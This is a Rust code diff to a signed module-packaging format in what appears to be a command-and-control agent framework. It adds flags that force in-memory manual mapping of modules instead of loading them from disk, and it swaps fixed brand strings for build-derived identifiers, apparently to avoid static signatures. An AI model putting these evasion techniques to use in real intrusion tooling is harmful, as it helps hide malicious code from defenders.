@@ -3,13 +3,35 @@
 
 use sha2::{Digest, Sha256};
 
-pub const MAGIC: &[u8; 4] = b"CKMS";
+use crate::wire_ids::PKG_MAGIC;
+
+/// Package magic (build-seed derived; not a product brand string).
+pub fn package_magic() -> &'static [u8; 4] {
+    &PKG_MAGIC
+}
+
 pub const FORMAT_VERSION: u16 = 1;
 /// HMAC key size (derived or configured 32-byte key)
 pub const KEY_LEN: usize = 32;
 
+/// CKMS flags (u16 LE at offset 6).
+pub const FLAG_PREF_MEM_MAP: u16 = 1 << 0;
+/// Fail closed if Manual-Map is unavailable / fails (no disk LoadLibrary).
+pub const FLAG_REQUIRE_MEM_MAP: u16 = 1 << 1;
+// bit 2 reserved: compressed payload
+
 /// Build a signed module blob: MAGIC | ver | flags | id_len | id | pay_len | payload | hmac32
 pub fn pack_module(id: &str, payload: &[u8], key: &[u8]) -> Result<Vec<u8>, String> {
+    pack_module_with_flags(id, payload, key, 0)
+}
+
+/// Pack with explicit CKMS flags (see `FLAG_*`).
+pub fn pack_module_with_flags(
+    id: &str,
+    payload: &[u8],
+    key: &[u8],
+    flags: u16,
+) -> Result<Vec<u8>, String> {
     if id.is_empty() || id.len() > 64 {
         return Err("invalid module id length".into());
     }
@@ -17,9 +39,9 @@ pub fn pack_module(id: &str, payload: &[u8], key: &[u8]) -> Result<Vec<u8>, Stri
         return Err("module key too short".into());
     }
     let mut body = Vec::with_capacity(4 + 2 + 2 + 2 + id.len() + 4 + payload.len() + 32);
-    body.extend_from_slice(MAGIC);
+    body.extend_from_slice(package_magic());
     body.extend_from_slice(&FORMAT_VERSION.to_le_bytes());
-    body.extend_from_slice(&0u16.to_le_bytes()); // flags
+    body.extend_from_slice(&flags.to_le_bytes());
     let id_bytes = id.as_bytes();
     body.extend_from_slice(&(id_bytes.len() as u16).to_le_bytes());
     body.extend_from_slice(id_bytes);
@@ -32,17 +54,25 @@ pub fn pack_module(id: &str, payload: &[u8], key: &[u8]) -> Result<Vec<u8>, Stri
 
 /// Verify HMAC and return (module_id, payload).
 pub fn unpack_and_verify(blob: &[u8], key: &[u8]) -> Result<(String, Vec<u8>), String> {
+    unpack_and_verify_ex(blob, key).map(|(id, payload, _flags)| (id, payload))
+}
+
+/// Verify HMAC and return (module_id, payload, flags).
+pub fn unpack_and_verify_ex(
+    blob: &[u8],
+    key: &[u8],
+) -> Result<(String, Vec<u8>, u16), String> {
     if blob.len() < 4 + 2 + 2 + 2 + 4 + 32 {
         return Err("blob too short".into());
     }
-    if &blob[0..4] != MAGIC {
-        return Err("bad magic".into());
+    if &blob[0..4] != package_magic().as_slice() {
+        return Err("bad package header".into());
     }
     let ver = u16::from_le_bytes([blob[4], blob[5]]);
     if ver != FORMAT_VERSION {
         return Err(format!("unsupported format version {ver}"));
     }
-    // flags at 6..8 ignored
+    let flags = u16::from_le_bytes([blob[6], blob[7]]);
     let id_len = u16::from_le_bytes([blob[8], blob[9]]) as usize;
     let id_start = 10;
     let id_end = id_start + id_len;
@@ -74,7 +104,7 @@ pub fn unpack_and_verify(blob: &[u8], key: &[u8]) -> Result<(String, Vec<u8>), S
     if got.as_slice() != expect {
         return Err("HMAC verify failed".into());
     }
-    Ok((id, payload))
+    Ok((id, payload, flags))
 }
 
 /// HMAC-SHA256 with key padding (RFC 2104 simplified)
@@ -105,16 +135,30 @@ pub fn hmac_sha256(key: &[u8], data: &[u8]) -> [u8; 32] {
     mac
 }
 
-/// Default module key material for dev/tests (production: derive from agent AES key).
-/// Seed must be exactly 32 bytes.
+/// Default module key material for **dev/tests only**.
+/// Production agents must derive the key from the agent AES key via `derive_module_key`.
+/// In release builds this panics if called — prevents silent shared default HMAC key.
 pub fn default_module_key() -> [u8; 32] {
-    *b"CUPCAKE_MODULE_KEY_V1_DEFAULT___" // 32 bytes
+    #[cfg(any(debug_assertions, test))]
+    {
+        // Dev-only; not a product brand string in release (release panics).
+        *b"DEV_ONLY_MODULE_KEY_V1_DO_NOT___" // 32 bytes
+    }
+    #[cfg(not(any(debug_assertions, test)))]
+    {
+        panic!("module key must be derived from agent key material");
+    }
 }
 
-/// Derive module key from agent AES key bytes.
+/// Whether the hard-coded default module key is available (debug/test only).
+pub fn default_module_key_allowed() -> bool {
+    cfg!(any(debug_assertions, test))
+}
+
+/// Derive module key from agent AES key bytes (domain label is build-seed derived).
 pub fn derive_module_key(aes_key: &[u8]) -> [u8; 32] {
     let mut h = Sha256::new();
-    h.update(b"cupcake-mod-key-v1");
+    h.update(crate::wire_ids::MOD_KEY_DOMAIN);
     h.update(aes_key);
     let d = h.finalize();
     let mut k = [0u8; 32];
@@ -151,5 +195,16 @@ mod tests {
         let mut bad = default_module_key();
         bad[0] ^= 1;
         assert!(unpack_and_verify(&blob, &bad).is_err());
+    }
+
+    #[test]
+    fn pack_with_flags_roundtrip() {
+        let key = default_module_key();
+        let flags = FLAG_PREF_MEM_MAP | FLAG_REQUIRE_MEM_MAP;
+        let blob = pack_module_with_flags("shell", b"payload", &key, flags).unwrap();
+        let (id, pay, got) = unpack_and_verify_ex(&blob, &key).unwrap();
+        assert_eq!(id, "shell");
+        assert_eq!(pay, b"payload");
+        assert_eq!(got, flags);
     }
 }
